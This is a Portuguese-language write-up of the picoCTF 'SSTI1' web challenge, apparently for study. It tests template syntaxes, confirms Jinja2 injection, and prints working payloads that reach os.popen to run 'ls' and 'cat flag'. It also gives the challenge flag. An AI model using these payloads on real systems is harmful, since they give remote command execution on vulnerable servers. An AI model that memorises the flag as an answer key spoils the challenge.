# [SST1]

###### Resolvido por @[SebastiaoKomada]

> Desafio Web Exploitation

## Sobre o Desafio

O enunciado apresenta a seguinte descrição: *"Criei um site bacana onde
você pode anunciar o que quiser! Experimente!\
Mais detalhes estarão disponíveis após o lançamento do seu desafio."*.\
Junto a isso, foi disponibilizada a dica: *"Server Side Template
Injection"*.

A pista indica que o desafio envolve uma injeção de código processado
pelo servidor, permitindo a extração da flag.

## Solução

### Primeiros testes

Ao acessar o sistema web, é exibida uma página com um campo de entrada
solicitando o conteúdo do anúncio:\
<img width="1470" height="803" alt="Captura de Tela 2025-09-23 às 15 55 07" src="https://github.com/user-attachments/assets/05ba0631-4dfc-4b0b-98cd-07dc8b25e956" />

O código da página apresenta a seguinte estrutura:

``` html
<!doctype html>
<title>SSTI1</title>

<h1> Home </h1>

 <p> I built a cool website that lets you announce whatever you want!* </p>

 <form action="/" method="POST">
    What do you want to announce: <input name="content" id="announce"> <button type="submit"> Ok </button>
 </form>
                
<p style="font-size:10px;position:fixed;bottom:10px;left:10px;"> *Announcements may only reach yourself </p>
```

Verifica-se que o formulário realiza um envio via método POST para a
rota `/`, transmitindo o valor do campo `content` ao servidor.

Quando qualquer valor é submetido (por exemplo, `ola`), a aplicação
responde com uma nova página exibindo o texto informado:\
<img width="1466" height="759" alt="Captura de Tela 2025-09-23 às 15 58 50" src="https://github.com/user-attachments/assets/08a34890-445f-4b81-aa39-0fa92a6f4a47" />

Considerando que o desafio envolve **Server Side Template Injection**,
foram testadas diferentes sintaxes de templates (`{{ ... }}`,
`{% ... %}`, `<% ... %>`, `<%= ... %>`, `${ ... }`).\
Apenas `{{ ... }}` produziu saída válida, sugerindo que a aplicação
utiliza a engine **Jinja2**.

Ao enviar `{{10*10}}`, a resposta confirma o processamento da
expressão:\
<img width="1470" height="760" alt="Captura de Tela 2025-09-23 às 16 02 11" src="https://github.com/user-attachments/assets/297812bb-c2c0-4bde-a79a-0119397e8d4e" />

Na etapa seguinte, foram pesquisados payloads capazes de escalar a
injeção até a execução de comandos no servidor. As seguintes referências
foram utilizadas:
https://onsecurity.io/article/server-side-template-injection-with-jinja2/

https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html?highlight=RCE%20jinja2#rce-escaping

Foi então aplicado o payload:
`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`

Esse método, que evita o uso direto de `.` e `_`, retornou como resposta
a listagem de arquivos disponíveis no diretório:
<img width="1470" height="763" alt="Captura de Tela 2025-09-23 às 16 10 23" src="https://github.com/user-attachments/assets/69f64799-ae21-425e-bffd-fa8600c22e32" />

Na saída, foi identificado o arquivo `flag`.\
Assim, utilizou-se o payload:

`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}}`

A resposta revelou o conteúdo da flag:\
<img width="1470" height="761" alt="Captura de Tela 2025-09-23 às 16 11 55" src="https://github.com/user-attachments/assets/83d4136e-6659-4116-8fad-59c221c9d71b" />

### Flag encontrada

Com isso, foi possível identificar a flag escondida:

**Flag:**\
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}`
